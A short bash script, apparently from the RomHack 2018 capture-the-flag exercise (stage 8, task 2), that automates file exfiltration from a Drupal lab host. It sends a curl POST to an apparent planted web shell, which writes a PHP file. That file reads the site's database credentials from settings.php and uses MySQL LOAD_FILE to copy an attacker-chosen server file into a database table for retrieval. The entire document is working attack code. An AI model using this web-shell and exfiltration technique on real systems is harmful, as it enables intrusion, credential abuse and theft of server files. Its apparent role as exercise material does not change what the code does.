#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo 
echo "STAGE8 / TASK2"
echo "Check: http://www.org.lan/sites/default/backupTable.php"
echo "to list the file(s) to exfiltrate"
echo
echo -n "FILE TO EXFILTRATE: "
read exfiltrate
echo 
echo "exfiltration-02.php content:"
cat <<EOF
echo "<?php
        require_once("settings.php");
        \$conn =  mysqli_connect(\$databases["default"]["default"]["host"], \$databases["default"]["default"]["username"], \$databases["default"]["default"]["password"]);
        \$query = mysqli_query(\$conn, "INSERT INTO backup.exfiltrate(data) values (LOAD_FILE("'\$exfiltrate'"));
?>" > exfiltration-02.php
EOF
echo
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' \
	--compressed \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Language: en-GB,en;q=0.5' \
	-H 'Connection: keep-alive' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'Pragma: no-cache' \
	-H 'Cache-Control: no-cache' \
	--data 'c=echo "<?php require_once(\"settings.php\");\$conn =  mysqli_connect(\$databases[\"default\"][\"default\"][\"host\"], \$databases[\"default\"][\"default\"][\"username\"], \$databases[\"default\"][\"default\"][\"password\"]);\$query = mysqli_query(\$conn, \"INSERT INTO backup.exfiltrate(data) values (LOAD_FILE(\\\"'$exfiltrate'\\\"));\");?>" > exfiltration-02.php'
echo "------"
echo
echo "Visit: http://www.org.lan/sites/default/exfiltration-02.php"
echo "To load file into backup.exfiltrate table"
